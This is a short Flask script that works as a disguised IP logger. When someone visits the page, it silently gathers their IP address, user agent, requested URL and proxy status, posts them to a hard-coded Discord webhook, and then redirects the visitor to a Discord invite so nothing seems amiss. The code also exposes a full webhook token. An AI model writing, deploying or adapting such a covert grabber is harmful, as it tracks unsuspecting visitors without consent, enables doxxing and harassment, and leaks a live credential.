import requests
import json
from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    # Collect user information
    user_info = {
        "location": request.url,
        "ipAddress": request.remote_addr,
        "userAgent": request.headers.get('User-Agent'),
        "isProxy": request.headers.get('X-Forwarded-For') is not None,  # Check for proxy
        # Add more info as needed
    }

    # Send user information to Discord webhook
    webhook_url = "https://discord.com/api/webhooks/1226851618000080916/OtNTRDQwUKio07JnVBUCEee_Thcied8N5yPTyqNBK2sGFvWUF72ZF9KVOq5TilwLI6wu"
    headers = {'Content-Type': 'application/json'}
    requests.post(webhook_url, headers=headers, data=json.dumps({"content": json.dumps(user_info)}))

    # Redirect user to Discord server invite link
    return redirect("https://discord.gg/FXzUCFpdNV")

if __name__ == '__main__':
    app.run(debug=True)
